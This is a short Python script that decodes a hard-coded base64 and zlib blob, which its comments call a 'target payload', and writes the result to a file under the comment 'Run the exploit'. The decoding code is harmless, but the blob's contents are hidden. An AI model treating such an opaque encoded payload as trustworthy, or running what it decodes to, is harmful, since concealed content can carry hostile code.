#!/usr/bin/env python3
import base64
import zlib

# Your target payload
payload = "eNo1kjt2JSEMRHPWooCSAInl+MyZzJH3H7hKPCd9KSH07X/f/79+BrwGYhyDw2KOZb4f45hjbDvX/JB3GcScdgasXG5pWYY7wm4+jckQNZyH0GHzUHZFHFtjF5Pta7NzbnNyhXUJfNqEbaIWE9EXlsQ5jQBj0UVepLJ3hGlY5MXjYTrF6Jrlew2pGtiUD5VOWqQU+62P9cq6lhTmKy9oP/ReVrxd4z7zarBjNqqZcWDYIjoZD9HJjiZZIsOAtLOk5NbmsqAh5Zaiq3bPHrtUQipl60cfJziHawpRzBRSCqGR9+akMPF32DqgV9APNju6+rKDsNpS9Vk8pkv2Im8/0vXInpjcPR/Xfdx4q99LLP0hL+x59huiAsnhAfpVWP676IgPoJ5aMxBPKb+0a/vjF8SXe7o="

def decode_and_decompress(data):
    try:
        # Step 1: Strip the Base64 armor back to raw binary
        raw_compressed = base64.b64decode(data)
        
        # Step 2: Inflate (decompress) the Zlib binary
        decompressed = zlib.decompress(raw_compressed)
        
        # Step 3: Decode the bytes back to a readable string
        return decompressed.decode('utf-8', errors='ignore')
        
    except Exception as e:
        return f"[-] Error during decoding: {e}"

# Run the exploit
result = decode_and_decompress(payload)

with open("dummy.txt", "w") as f:
    f.write(result)

print("[+] Extraction Successful:\n")